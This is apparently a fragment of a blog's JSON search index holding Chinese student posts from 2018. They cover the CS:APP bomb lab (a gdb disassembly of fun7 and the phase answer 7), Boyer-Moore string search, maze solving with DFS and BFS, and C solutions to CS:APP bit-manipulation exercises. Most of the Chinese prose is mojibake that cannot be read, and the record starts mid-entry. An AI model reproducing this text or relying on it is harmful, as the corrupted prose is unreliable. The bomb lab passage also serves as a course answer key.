\u003cexplode_bomb\u003e 0x00000000004011d1 \u003c+64\u003e: mov $0x4024d0,%edi 0x00000000004011d6 \u003c+69\u003e: callq 0x400ac0 \u003cputs@plt\u003e 0x00000000004011db \u003c+74\u003e: callq 0x401682 \u003cphase_defused\u003e 0x00000000004011e0 \u003c+79\u003e: pop %rbx 0x00000000004011e1 \u003c+80\u003e: retq ---Type \u003creturn\u003e to continue, or q \u003creturn\u003e to quit--- End of assembler dump. (gdb) disas fun7 Dump of assembler code for function fun7: 0x0000000000401153 \u003c+0\u003e: sub $0x8,%rsp 0x0000000000401157 \u003c+4\u003e: test %rdi,%rdi 0x000000000040115a \u003c+7\u003e: je 0x401187 \u003cfun7+52\u003e 0x000000000040115c \u003c+9\u003e: mov (%rdi),%edx 0x000000000040115e \u003c+11\u003e: cmp %esi,%edx 0x0000000000401160 \u003c+13\u003e: jle 0x40116f \u003cfun7+28\u003e 0x0000000000401162 \u003c+15\u003e: mov 0x8(%rdi),%rdi 0x0000000000401166 \u003c+19\u003e: callq 0x401153 \u003cfun7\u003e 0x000000000040116b \u003c+24\u003e: add %eax,%eax 0x000000000040116d \u003c+26\u003e: jmp 0x40118c \u003cfun7+57\u003e 0x000000000040116f \u003c+28\u003e: mov $0x0,%eax 0x0000000000401174 \u003c+33\u003e: cmp %esi,%edx 0x0000000000401176 \u003c+35\u003e: je 0x40118c \u003cfun7+57\u003e 0x0000000000401178 \u003c+37\u003e: mov 0x10(%rdi),%rdi 0x000000000040117c \u003c+41\u003e: callq 0x401153 \u003cfun7\u003e 0x0000000000401181 \u003c+46\u003e: lea 0x1(%rax,%rax,1),%eax 0x0000000000401185 \u003c+50\u003e: jmp 0x40118c \u003cfun7+57\u003e 0x0000000000401187 \u003c+52\u003e: mov $0xffffffff,%eax 0x000000000040118c \u003c+57\u003e: add $0x8,%rsp 0x0000000000401190 \u003c+61\u003e: retq End of assembler dump. æ­¤é¢˜é¢˜æ„ä¸ºåœ¨ä¸€ä¸ªé¢˜ç›®ä¸­æ„å»ºå¥½çš„å¹³è¡¡äºŒå‰æ ‘ä¸­ä»æ ¹èŠ‚ç‚¹å¼€å§‹æŸ¥æ‰¾ä¸€ä¸ªè¾“å…¥çš„æ•°. ç”±èŠ‚ç‚¹å‘å·¦ä¸º 0,ç”±èŠ‚ç‚¹å‘å³ä¸º 1,æŸ¥æ‰¾è·¯å¾„åºçš„ 0-1 åˆ—ä»å³å‘å·¦æ„æˆä¸€ä¸ªäºŒè¿›åˆ¶æ•°,è¯¥ äºŒè¿›åˆ¶æ•°çš„åè¿›åˆ¶å€¼å¿…é¡»ç­‰äºé¢˜ç›®ä¸­æä¾›çš„æ•°,å…¶ä¸º 4,é‚£ä¹ˆæ‰€éœ€æŸ¥æ‰¾è·¯å¾„åºåˆ—ä¸º 100, æ ¹æ®äºŒå‰æ ‘ç»“æ„,åº”è¯¥æŸ¥æ‰¾ 7,æ•…ç­”æ¡ˆä¸º 7. ","date":"2018-12-01","objectID":"/posts/csapp-bomb-lab/:8:0","tags":["CS:APP","æ±‡ç¼–","äºŒè¿›åˆ¶ç‚¸å¼¹"],"title":"CS:APP Bomb lab","uri":"/posts/csapp-bomb-lab/"},{"categories":["CS:APP"],"content":"è¿è¡Œæˆªå›¾ ","date":"2018-12-01","objectID":"/posts/csapp-bomb-lab/:9:0","tags":["CS:APP","æ±‡ç¼–","äºŒè¿›åˆ¶ç‚¸å¼¹"],"title":"CS:APP Bomb lab","uri":"/posts/csapp-bomb-lab/"},{"categories":["æ•°æ®ç»“æ„"],"content":"è®¾è®¡æ€è·¯ BM ç®—æ³•æ˜¯ä¸€ç§åç¼€åŒ¹é…ç®—æ³•,å…¶å…·æœ‰æ¯” KMP ç®—æ³•æ›´ä¼˜ç§€çš„æ€§èƒ½è¡¨ç°.å…¶æ ¸å¿ƒæ€æƒ³æœ‰äºŒ ,ç¬¬ä¸€æ˜¯åå­—ç¬¦,åå­—ç¬¦å°±æ˜¯ pattern ä¸ text ä»å³å¾€å·¦ç¬¬ä¸€å¤±é…çš„åœ¨ text ä¸­çš„å­—ç¬¦, äºŒæ˜¯å¥½åç¼€,å¥½åç¼€å°±æ˜¯ pattern ä¸ text ä»å³å¾€å·¦è¿ç»­åŒ¹é…æˆåŠŸçš„å­ä¸².å¯¹äºåå­—ç¬¦ å’Œå¥½åç¼€,æœ‰å„è‡ªçš„æ¨¡å¼ä¸²ç§»åŠ¨è§„åˆ™,å¯ä»¥ç¡®å®šå„è‡ªå¤±é…æ—¶éœ€è¦ç§»åŠ¨çš„ä½æ•°,æœ€ç»ˆé€‰ æ‹©äºŒè€…ä¸­ç§»åŠ¨ä½æ•°è¾ƒå¤§è€…ç§»åŠ¨.åœ¨ä¸»å‡½æ•°ä¸­,è®©ç”¨æˆ·è¾“å…¥æ–‡æ¡£åä¸éœ€è¦æŸ¥æ‰¾çš„å•è¯. æ¯æ¬¡ä»æ–‡æ¡£ä¸­è¯»å–ä¸€è¡Œè¿›è¡ŒåŒ¹é…æœç´¢,æ¯æ¬¡ä½¿ç”¨ BM ç®—æ³•æœç´¢å®Œæˆå,è‹¥æœç´¢åˆ°å•è¯, åˆ™å°†ä¸»ä¸²ä¸­å¼€å§‹åŒ¹é…çš„ä½ç½®å®šä¸ºæŸ¥æ‰¾åˆ°å•è¯çš„ä¸‹ä¸€è¡Œ,ä½¿ç”¨ BM ç®—æ³•è¿›è¡Œä¸‹ä¸€ä¸ªåŒ¹é… æœç´¢,ç›´è‡³æœç´¢å®Œå½“å‰è¡Œ.è€Œåå¾ªç¯ç›´è‡³åŒ¹é…å®Œæ•´ä¸ªæ–‡æ¡£. ä»£ç è¯´æ˜ int* CreateBC(char* pattern, int len); ä¼ å…¥æ¨¡å¼ä¸²åŠå…¶é•¿åº¦,è¿”å›æ ¹æ®åå­—ç¬¦çš„è·³è½¬æ•°ç»„. int* CreateSuffix(char* pattern, int len); int* CreateGS(char* pattern, int len); ä¸¤ä¸ªå‡½æ•°éƒ½éœ€è¦ä¼ å…¥æ¨¡å¼ä¸²åŠå…¶é•¿åº¦,ç¬¬ä¸€ä¸ªå‡½æ•°è¿”å›å…¶åç¼€æ•°ç»„,ç¬¬äºŒä¸ªå‡½æ•°è°ƒ ç”¨ç¬¬ä¸€ä¸ªå‡½æ•°è¿”å›æ ¹æ®å¥½åç¼€çš„è·³è½¬æ•°ç»„. int bm_search(char* text, int text_len, char* pattern, int pattern_len, int *bc, int *gs); ä¼ å…¥ä¸»ä¸²åŠå…¶é•¿åº¦,æ¨¡å¼ä¸²åŠå…¶é•¿åº¦,åå­—ç¬¦è·³è½¬æ•°ç»„,å¥½åç¼€è·³è½¬æ•°ç»„.è¿”å›åœ¨ä¸»ä¸² ä¸­æŸ¥æ‰¾åˆ°æ¨¡å¼ä¸²çš„ç¬¬ä¸€ä¸ªä½ç½®,æœªæŸ¥æ‰¾åˆ°,åˆ™è¿”å›-1. char* get_line(FILE *article, char (\u0026text)[1000]); ä»ç»™å®šçš„ article æ–‡ä»¶ä¸­è¯»å–æœ€å¤§ 1000 å­—ç¬¦çš„ä¸€è¡Œ,å­˜åœ¨ text ä½ç½®,è¯»å–åˆ°æ–‡ä»¶æœ«å°¾ åˆ™è¿”å› NULL. è¿è¡Œç»“æœ æ­¤ä¸ºä»é©¬ä¸è·¯å¾·é‡‘çš„ I hava a dream æ¼”è®²ç¨¿ä¸­æŸ¥æ‰¾ dream å¾—å‡ºçš„ç»“æœ. ","date":"2018-12-01","objectID":"/posts/ds-bm/:0:0","tags":["ä¸²åŒ¹é…"],"title":"æ•°æ®ç»“æ„:BMç®—æ³•","uri":"/posts/ds-bm/"},{"categories":["æ•°æ®ç»“æ„"],"content":"è®¾è®¡æ€è·¯ ","date":"2018-11-10","objectID":"/posts/ds-maze/:0:0","tags":["æ•°æ®ç»“æ„","è¿·å®«é—®é¢˜"],"title":"æ•°æ®ç»“æ„:è¿·å®«é—®é¢˜","uri":"/posts/ds-maze/"},{"categories":["æ•°æ®ç»“æ„"],"content":"å›¾ç¼–å· å¦‚å›¾æ‰€ç¤ºï¼Œä»ä¸Šåˆ°ä¸‹ï¼Œä»å·¦åˆ°å³ï¼Œç»™ 17 ä¸ªé¡¶ç‚¹è¿›è¡Œç¼–å·ï¼Œä»¥ä¸¤ä¸ªé¡¶ç‚¹ä»£è¡¨ä¸€æ¡è¾¹ï¼Œä¾‹å…¥ 2-3 ä»£è¡¨å¯ä»¥ä»é¡¶ç‚¹ 2 èµ°åˆ°é¡¶ç‚¹ 3ã€‚é—®é¢˜å³ä¸ºæ±‚è§£ä» 2 -\u003e 17 çš„é€šè·¯ã€‚ ","date":"2018-11-10","objectID":"/posts/ds-maze/:1:0","tags":["æ•°æ®ç»“æ„","è¿·å®«é—®é¢˜"],"title":"æ•°æ®ç»“æ„:è¿·å®«é—®é¢˜","uri":"/posts/ds-maze/"},{"categories":["æ•°æ®ç»“æ„"],"content":"æ±‚è§£æ€æƒ³ æ±‚è§£ä¸€æ¡é€šè·¯ï¼Œåº”å½“ä»èµ·ç‚¹å‡ºå‘ï¼Œä¸æ–­å‰è¿›åˆ°åç»­å¯è¡Œé¡¶ç‚¹ï¼Œå½“åœ¨ä¸€ä¸ªé¡¶ç‚¹æ— æ³•ç»§ç»­å‰è¿›æ—¶ï¼Œåˆ™å›é€€åˆ°ä¸Šä¸€ä¸ªé¡¶ç‚¹ï¼Œå¯»æ‰¾å…¶ä»–å¯è¡Œé¡¶ç‚¹ï¼Œç›´åˆ°åˆ°è¾¾ç»ˆç‚¹ã€‚æ­¤æ€æƒ³ç¬¦åˆæ•°æ®ç»“æ„æ ˆçš„ç‰¹ç‚¹ã€‚é¦–å…ˆå°†èµ·ç‚¹å‹æ ˆï¼Œç„¶åå°†ä»å½“å‰é¡¶ç‚¹å¯åˆ°è¾¾çš„ä¸€ä¸ªé¡¶ç‚¹å‹æ ˆï¼Œç„¶åå°†è¯¥é¡¶ç‚¹æ ‡è®°ä¸ºå·²è®¿é—®ï¼Œéšååˆ°è¾¾ä¸‹ä¸€ä¸ªé¡¶ç‚¹ï¼Œåœ¨æŸä¸ªé¡¶ç‚¹æ— æ³•ç»§ç»­èµ°é€šæ—¶ï¼Œå°†å½“å‰é¡¶ç‚¹å‡ºæ ˆï¼Œå›é€€åˆ°ä¸Šä¸€ä¸ªé¡¶ç‚¹é‡æ–°é€‰æ‹©å¯ä»¥åˆ°è¾¾çš„ä¸”æœªè®¿é—®çš„é¡¶ç‚¹ã€‚å¦‚æ­¤å¾ªç¯ï¼Œç›´åˆ°ç»ˆç‚¹è¢«å‹å…¥æ ˆä¸­ï¼Œæ­¤æ—¶æ ˆä¸­æ‰€æœ‰é¡¶ç‚¹å³ä¸ºä¸€æ¡é€šè·¯ã€‚ æ±‚è§£ä¸€æ¡æœ€çŸ­è·¯å¾„ï¼Œåº”å½“ä»èµ·ç‚¹å‡ºå‘ï¼Œè®¿é—®æ‰€æœ‰å¯ä»¥åˆ°è¾¾çš„ä¸‹ä¸€çº§é¡¶ç‚¹ã€‚å†ä»æ‰€æœ‰ä¸‹ä¸€çº§é¡¶ç‚¹å‡ºå‘ï¼Œè®¿é—®æ‰€æœ‰å¯è®¿é—®çš„å†ä¸‹ä¸€çº§é¡¶ç‚¹ï¼Œå¦‚æ­¤å¾ªç¯ï¼Œæ¯ä¸€çº§é¡¶ç‚¹è·èµ·ç‚¹è·ç¦»ç›¸åŒã€‚è¿‡ç¨‹ä¸­è®°å½•è·¯çº¿ã€‚æ­¤æƒ³æ³•ç¬¦åˆæ•°æ®ç»“æ„ä¸­é˜Ÿåˆ—çš„ç‰¹ç‚¹ã€‚é¦–å…ˆï¼Œå°†èµ·ç‚¹å…¥é˜Ÿã€‚ç„¶åå°†é˜Ÿå¤´å…ƒç´ å‡ºé˜Ÿï¼Œå°†è¯¥å…ƒç´ å¯è®¿é—®åˆ°çš„ä¸”æœªè¢«è®¿é—®çš„é¡¶ç‚¹ç½®ä¸ºå·²è®¿é—®ï¼Œç„¶åå…¥é˜Ÿï¼Œæ³¨æ„è®°å½•è¢«å…¥é˜ŸèŠ‚ç‚¹çš„å‰ä¸€ä¸ªèŠ‚ç‚¹ã€‚ç›´åˆ°é˜Ÿåˆ—ä¸ºç©ºã€‚æœ€åé¡ºç€ç»ˆç‚¹çš„å‰é©±é¡¶ç‚¹è¾“å‡ºå³å¯å¾—åˆ°è·¯çº¿ã€‚è‹¥æœ‰å¤šä¸ªç»ˆç‚¹ï¼Œè¦å¯»æ‰¾åˆ°æœ€è¿‘çš„ç»ˆç‚¹å‡ºå»ï¼Œåˆ™å°†ç»“æŸå¾ªç¯æ¡ä»¶æ”¹ä¸ºæœ‰ç»ˆç‚¹å…¥é˜Ÿå³å¯ã€‚ ä»£ç è¯´æ˜ ","date":"2018-11-10","objectID":"/posts/ds-maze/:2:0","tags":["æ•°æ®ç»“æ„","è¿·å®«é—®é¢˜"],"title":"æ•°æ®ç»“æ„:è¿·å®«é—®é¢˜","uri":"/posts/ds-maze/"},{"categories":["æ•°æ®ç»“æ„"],"content":"ç»“æ„ä½“åŠå…¨å±€å˜é‡å®šä¹‰ typedef struct p //è¡¨ç¤ºé¡¶ç‚¹,ç”¨äºå¯»æ‰¾æœ€çŸ­è·¯å¾„æ—¶è®°å½•è·¯å¾„ { int code; struct p* pre; //å‰ä¸€ä¸ªé¡¶ç‚¹ } Ver; const int edge_cnt = 29; //è¾¹çš„æ•°é‡ const int ver_cnt = 17; //é¡¶ç‚¹æ•°é‡ int map[edge_cnt][2]; //è®°å½•è¾¹ int my_stack[MAX] = {0}; //æ•°ç»„æ¨¡æ‹Ÿæ ˆ int my_quque[MAX] = {0}; //æ•°ç»„æ¨¡æ‹Ÿé˜Ÿåˆ— int top = 0; //æ ˆé¡¶æŒ‡ç¤º int front = 0, rear = 0; //é˜Ÿåˆ—é¦–ä½æŒ‡ç¤º bool visit[ver_cnt + 1] = {false}; //è®°å½•ç‚¹æ˜¯å¦è®¿é—®è¿‡ Ver vers[ver_cnt + 1]; //æ¯ä¸ªç‚¹è·¯å¾„é“¾è¡¨å¤´ç»“ç‚¹ ","date":"2018-11-10","objectID":"/posts/ds-maze/:3:0","tags":["æ•°æ®ç»“æ„","è¿·å®«é—®é¢˜"],"title":"æ•°æ®ç»“æ„:è¿·å®«é—®é¢˜","uri":"/posts/ds-maze/"},{"categories":["æ•°æ®ç»“æ„"],"content":"å‡½æ•°å®šä¹‰ void loadmaze(); //è¯»å…¥è¿·å®«åœ°å›¾ void visited(int i); //å°†ç‚¹içŠ¶æ€ç½®ä¸ºè®¿é—®è¿‡ bool isvisited(int i); //åˆ¤æ–­ç‚¹iæ˜¯å¦è®¿é—®è¿‡ bool hasway(int s); //ä»ç‚¹så‡ºå‘æ˜¯å¦æœ‰æ²¡å»è¿‡çš„å¯è¡Œè·¯å¾„ void find_way(int start, int end); //æ‰¾åˆ°ä¸€æ¡é€šè·¯ void find_least(int start, int end); //æ‰¾åˆ°ä¸€æ¡æœ€çŸ­è·¯å¾„ è¿è¡Œç»“æœ å®éªŒæ€»ç»“ æœ¬æ¬¡å®éªŒï¼Œæ±‚è§£è¿·å®«é€šè·¯å’Œæœ€çŸ­é€šè·¯ï¼Œåœ¨ä¸åˆ©ç”¨é€’å½’çš„æƒ…å†µä¸‹ï¼Œä½¿ç”¨æ¨¡æ‹Ÿçš„æ ˆå’Œé˜Ÿåˆ—ï¼Œå®ç°äº†æ·±åº¦ä¼˜å…ˆæœç´¢å’Œå¹¿åº¦ä¼˜å…ˆæœç´¢ã€‚åŠ å¼ºäº†å¯¹äºæ ˆå’Œé˜Ÿåˆ—çš„ç†è§£ä»¥åŠä½¿ç”¨ç†Ÿç»ƒåº¦ã€‚ ","date":"2018-11-10","objectID":"/posts/ds-maze/:4:0","tags":["æ•°æ®ç»“æ„","è¿·å®«é—®é¢˜"],"title":"æ•°æ®ç»“æ„:è¿·å®«é—®é¢˜","uri":"/posts/ds-maze/"},{"categories":["CS:APP"],"content":"CS:APP 2.60 #include \u003cstdio.h\u003eunsigned replace_byte(unsigned x, int i, unsigned char b) { x = x \u0026 (~(0XFF \u003c\u003c (i \u003c\u003c 3)));//ç›¸åº”å­—èŠ‚ç½®é›¶ x = x | (b \u003c\u003c (i \u003c\u003c 3)); //ç›¸åº”å­—èŠ‚æ”¹ä¸ºchar b return x; } int main() { unsigned ret = replace_byte(0X12345678, 1, 0XAB); printf(\"0X%X\\n\", ret); return 0; } 0X1234AB78 åˆ©ç”¨æŒ‰ä½è¿ç®—$x \\\u0026 1 = x , b | 0 = b$ã€‚ Csapp 2.65 #include \u003cstdio.h\u003eint odd_ones(unsigned x) { x ^= x \u003e\u003e 16; x ^= x \u003e\u003e 8; x ^= x \u003e\u003e 4; x ^= x \u003e\u003e 2; x ^= x \u003e\u003e 1; return x \u0026 1; } int main() { int x = odd_ones(0XB); printf(\"%d\\n\", x); return 0; } 1 å¯¹ 32 ä½ç¼–ç ï¼Œ1 äº¦æˆ–æ‰€æœ‰ 0 ä»ä¸º 1ï¼Œå¶æ•°ä¸ª 1 è¿ç»­äº¦æˆ–ç»“æœä¸º 0ï¼Œå¥‡æ•°ä¸ª 1 è¿ç»­äº¦æˆ–ç»“æœä¸º 1ã€‚å¯¹ 32 ä½æ•°ï¼ŒæŒ‰ç…§å³ç§» 16ï¼Œ8ï¼Œ4ï¼Œ2ï¼Œ1 ä¾æ¬¡å³ç§»ä½¿å¾—å‰åå„äºŒåˆ†ä¹‹ä¸€ç¼–ç å¯¹é½ï¼Œäº¦æˆ–ç»“æœå­˜åœ¨åäºŒåˆ†ä¹‹ä¸€ç¼–ç ä¸­ï¼Œç›´è‡³äº¦æˆ–æ€»ç»“è¿‡å­˜äºæœ€ä½ä½ä¸­ï¼Œç»“æŸï¼Œå–æœ€ä½ä½è¿”å›ã€‚ Csapp 2.67 ","date":"2018-11-08","objectID":"/posts/csapp-problems/:0:0","tags":["CS:APP"],"title":"CS:APPè§£é¢˜è®°å½•","uri":"/posts/csapp-problems/"},{"categories":["CS:APP"],"content":"A åœ¨ int ä¸º w ä½çš„æœºå™¨ä¸­ï¼Œç§»ä½é•¿åº¦ä¸åº”è¯¥è¶…è¿‡$w - 1$ã€‚ ","date":"2018-11-08","objectID":"/posts/csapp-problems/:1:0","tags":["CS:APP"],"title":"CS:APPè§£é¢˜è®°å½•","uri":"/posts/csapp-problems/"},{"categories":["CS:APP"],"content":"B #include \u003cstdio.h\u003e#include \u003climits.h\u003eint int_size_is_32() { return 1 \u003c\u003c 31 == INT_MIN; } int main() { printf(\"%d\\n\", int_size_is_32()); return 0; } 1 è‹¥ int ä¸º 32 ä½,åˆ™$1 Â« 31 ==$ INT_MIN. ","date":"2018-11-08","objectID":"/posts/csapp-problems/:2:0","tags":["CS:APP"],"title":"CS:APPè§£é¢˜è®°å½•","uri":"/posts/csapp-problems/"},{"categories":["CS:APP"],"content":"C #include \u003cstdio.h\u003e#include \u003climits.h\u003eint int_size_is_32_for_16() { return (1 \u003c\u003c 15 != INT_MIN) \u0026\u0026 ((1 \u003c\u003c 31) == INT_MIN); } int main() { printf(\"%d\\n\", int_size_is_32_for_16()); return 0; } 1 å½“$1 Â« 15 !=$ INT_MINï¼Œè¯æ˜ int é 16 ä½åï¼Œåé¢å³å¯åˆ¤æ–­ int æ˜¯å¦ä¸º 32 ä½. Csapp 2.68 #include \u003cstdio.h\u003eint lower_one_mask(int n) { return (int)(0XFFFFFFFFu \u003e\u003e (32 - n)); } int main() { printf(\"0X%X\\n\", lower_one_mask(6)); return 0; } 0X3F å°†æ— ç¬¦å· int æœ€å¤§å€¼å³ç§»$(32 - n)$ä½ï¼Œè¿›è¡Œäº†é€»è¾‘å³ç§»ï¼Œå†å¼ºåˆ¶è½¬æ¢ä¸ºæœ‰ç¬¦å· intã€‚ ","date":"2018-11-08","objectID":"/posts/csapp-problems/:3:0","tags":["CS:APP"],"title":"CS:APPè§£é¢˜è®°å½•","uri":"/posts/csapp-problems/"}]